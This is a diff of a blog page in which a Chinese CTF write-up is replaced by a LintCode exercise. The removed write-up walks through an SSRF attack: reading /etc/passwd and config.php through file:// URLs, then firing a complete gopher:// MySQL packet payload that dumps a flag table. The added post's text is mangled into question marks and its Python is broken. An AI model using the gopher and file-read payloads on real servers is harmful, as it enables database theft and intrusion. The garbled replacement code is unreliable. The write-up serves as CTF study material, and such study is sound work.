@@ -15,7 +15,7 @@
     <meta name="description" content="">
     <meta name="Cache-Control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>Gopher攻击MySql · Ywc&#39;s blog</title>
+    <title>LintCode???? · Ywc&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -210,7 +210,7 @@
                 <a href="/" >Ywc&#39;s blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">Gopher攻击MySql</a>
+                <a href="#" class="post-name">LintCode????</a>
             </div>
     </div>
     
@@ -242,7 +242,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            Gopher攻击MySql
+            LintCode????
             <!-- 404 -->
             
         </h1>
@@ -261,18 +261,18 @@ height:50vh;
                 
                     <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "CTF、漏洞">CTF、漏洞</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "learn">learn</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">549</span> / Reading time: <span class="post-count">3 min</span></span>
+                        <span>Word count: <span class="post-count">92</span> / Reading time: <span class="post-count">1 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/07/31</span>
+                    <span class="post-intro-time">2019/03/20</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -396,42 +396,24 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>题目链接：<a href="http://35.190.142.60/" target="_blank" rel="noopener">http://35.190.142.60/</a></p>
-<p>打开题目是个curl的界面，可以想到是SSRF</p>
-<p><img src="/2018/07/31/Gopher/1.png" alt="Gopher"></p>
-<p>右键打开源代码发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- index.php?debug=1--&gt;</span><br></pre></td></tr></table></figure></p>
-<p>于是访问请求<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://35.190.142.60/?debug=1</span><br></pre></td></tr></table></figure></p>
-<p>得到页面源代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"config.php"</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])&amp;&amp;!<span class="keyword">empty</span>($_POST[<span class="string">'url'</span>])) </span><br><span class="line">&#123; </span><br><span class="line">    $url = $_POST[<span class="string">'url'</span>]; </span><br><span class="line">    $content_url = getUrlContent($url); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    $content_url = <span class="string">""</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>])) </span><br><span class="line">&#123; </span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">echo</span> $content_url; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>根据代码，考察的是文件读取，读源代码,尝试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/passwd</span><br></pre></td></tr></table></figure></p>
-<p>发现回显</p>
-<p><img src="/2018/07/31/Gopher/2.png" alt="Gopher"></p>
-<p>于是发现必须得有localhost的host</p>
-<p>于是改变请求方式为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file://loaclhost/etc/passwd</span><br></pre></td></tr></table></figure></p>
-<p>有回显，继续尝试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file://localhost/var/www/html/config.php</span><br></pre></td></tr></table></figure></p>
-<p>成功得到源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$hosts = <span class="string">"localhost"</span>;</span><br><span class="line">$dbusername = <span class="string">"ssrf_user"</span>;</span><br><span class="line">$dbpasswd = <span class="string">""</span>;</span><br><span class="line">$dbname = <span class="string">"ssrf"</span>;</span><br><span class="line">$dbport = <span class="number">3306</span>;</span><br><span class="line"></span><br><span class="line">$conn = mysqli_connect($hosts,$dbusername,$dbpasswd,$dbname,$dbport);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initdb</span><span class="params">($conn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $dbinit = <span class="string">"create table if not exists flag(secret varchar(100));"</span>;</span><br><span class="line">    <span class="keyword">if</span>(mysqli_query($conn,$dbinit)) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $tmpurl = parse_url($url, PHP_URL_HOST);</span><br><span class="line">    <span class="keyword">if</span>($tmpurl != <span class="string">"localhost"</span> <span class="keyword">and</span> $tmpurl != <span class="string">"127.0.0.1"</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        var_dump($tmpurl);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&lt;h1&gt;Only access to localhost&lt;/h1&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $url;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUrlContent</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">    $url = safe($url);</span><br><span class="line">    $url = escapeshellarg($url);</span><br><span class="line">    $pl = <span class="string">"curl "</span>.$url;</span><br><span class="line">    <span class="keyword">echo</span> $pl;</span><br><span class="line">    $content = shell_exec($pl);</span><br><span class="line">    <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br><span class="line">initdb($conn);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>通过代码可以看出mysql的存在，以及简单的url。</p>
-<p>这里考察是gopher打mysql</p>
-<p>测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://localhost:3306</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2018/07/31/Gopher/3.png" alt="Gopher"></p>
-<p>思路争取使用payload生成脚本</p>
-<p>命令为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exploit.py -u ssrf_user -d &apos;ssrf&apos; -P &apos;SELECT * FROM ssrf.flag&apos; -v</span><br></pre></td></tr></table></figure></p>
-<p>生成payload:</p>
-<pre><code>gopher://127.0.0.1:3306/A0%00%00%01O%B7%00%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00ssrf_user%00%00ssrf%00V%01%00%00%03select%20concat%28cast%280x504b03040a00000000000000000000000000e8030000e803000010000000746869735f69735f7468655f666c6167%20as%20binary%29%2C%20rpad%28%28SELECT%20%2A%20FROM%20ssrf.flag%29%2C%201000%2C%20%27-%27%29%2C%20cast%280x504b01021e030a00000000000000000000000000100000000000000000000000000000000000746869735f69735f7468655f666c6167504b0506000000000100010036000000640000000000%20as%20binary%29%29%00%00%00%00
-</code></pre><p>发送请求即可得到flag</p>
-<p><img src="/2018/07/31/Gopher/4.png" alt="Gopher"></p>
-<h2 id="Gopher攻击mysql"><a href="#Gopher攻击mysql" class="headerlink" title="Gopher攻击mysql"></a>Gopher攻击mysql</h2><p>exploit.py的项目地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/undefinedd/extract0r-</span><br></pre></td></tr></table></figure></p>
-<p>参考文章：<a href="http://www.freebuf.com/articles/web/159342.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/159342.html</a></p>
-<p><a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2" target="_blank" rel="noopener">https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2</a></p>
-<p><a href="https://blog.chaitin.cn/gopher-attack-surfaces/#h2_%E6%94%BB%E5%87%BB%E9%9D%A2%E6%B5%8B%E8%AF%95" target="_blank" rel="noopener">https://blog.chaitin.cn/gopher-attack-surfaces/#h2_%E6%94%BB%E5%87%BB%E9%9D%A2%E6%B5%8B%E8%AF%95</a></p>
-<p><a href="https://xz.aliyun.com/t/2500#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/2500#toc-1</a></p>
+        <h2 id=""><a href="#" class="headerlink" title="????"></a>????</h2><p>???? k ? 0 ? n ????????k ??? 0~9 ?????<br>??<br>?? 1?</p>
+<ul>
+<li>???k = 1, n = 1<br>???1<br>???? [0, 1] ?????? 1 ??? 1 ? (1)?</li>
+</ul>
+<p>?? 2?</p>
+<ul>
+<li>???k = 1, n = 12<br>???5<br>???? [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12] ?????? 1 ??? 5 ? (1, 10, 11, 12)?</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">digitCounts</span><span class="params">(self, k, n)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(n&gt;=<span class="number">0</span> <span class="keyword">and</span> <span class="number">0</span> &lt;= k &lt;= <span class="number">9</span>)</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n+<span class="number">1</span>):</span><br><span class="line">        j=i</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">if</span> j%<span class="number">10</span>==k:</span><br><span class="line">            count+=<span class="number">1</span></span><br><span class="line">        j/=<span class="number">10</span></span><br><span class="line">        <span class="keyword">if</span> j==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> count</span><br></pre></td></tr></table></figure>
+<p>## </p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者: <a href="https://yinwc.github.io">Ywc</a>
-            <p>原文链接: <a href="https://yinwc.github.io/2018/07/31/Gopher/">https://yinwc.github.io/2018/07/31/Gopher/</a>
-            <p>发表日期: <a href="https://yinwc.github.io/2018/07/31/Gopher/">July 31st 2018, 10:29:49 am</a>
+            <p>原文链接: <a href="https://yinwc.github.io/2019/03/20/ACM练习/">https://yinwc.github.io/2019/03/20/ACM练习/</a>
+            <p>发表日期: <a href="https://yinwc.github.io/2019/03/20/ACM练习/">March 20th 2019, 4:07:13 pm</a>
             <p>版权声明: </p>
         </div>
     
@@ -440,16 +422,16 @@ height:50vh;
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href= "/2018/08/05/RCTF-2018/" title= RCTF-2018 cpushop >
-                    <div class="nextTitle">RCTF-2018 cpushop</div>
+                <a href= "/2019/03/26/反向代理/" title= 反向代理 >
+                    <div class="nextTitle">反向代理</div>
                 </a>
             
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/07/30/dedecms/" title= dedecms后台getshell漏洞还原分析 >
-                    <div class="prevTitle">dedecms后台getshell漏洞还原分析</div>
+                <a href= "/2019/03/18/msf常用操作/" title= MSF常用操作 >
+                    <div class="prevTitle">MSF常用操作</div>
                 </a>
             
         </li>
@@ -561,7 +543,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目"><span class="toc-number">1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gopher攻击mysql"><span class="toc-number">2.</span> <span class="toc-text">Gopher攻击mysql</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#"><span class="toc-number">1.</span> <span class="toc-text">????</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
